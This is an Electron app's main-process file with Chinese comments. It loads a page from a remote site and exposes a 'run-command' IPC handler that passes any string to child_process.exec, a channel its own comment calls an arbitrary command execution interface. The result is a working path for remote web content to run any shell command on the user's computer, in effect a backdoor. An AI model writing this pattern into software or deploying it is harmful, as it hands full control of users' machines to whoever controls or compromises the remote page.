const { app, BrowserWindow, ipcMain } = require("electron");
const path = require("path");
const { exec } = require("child_process");

function createWindow() {
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
      contextIsolation: true,
      nodeIntegration: false
    }
  });

  mainWindow.loadURL("https://zydzyd.top/srczydzyd8866/test.html"); // 或本地网页
}

// 任意命令执行接口
ipcMain.handle("run-command", async (event, cmd) => {
  return new Promise((resolve, reject) => {
    console.log("准备执行命令:", cmd);
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error("执行失败:", stderr || error.message);
        reject(`❌ 执行失败: ${stderr || error.message}`);
      } else {
        console.log("执行成功:", stdout || cmd);
        resolve(`✅ 成功执行: ${stdout || cmd}`);
      }
    });
  });
});

app.whenReady().then(createWindow);
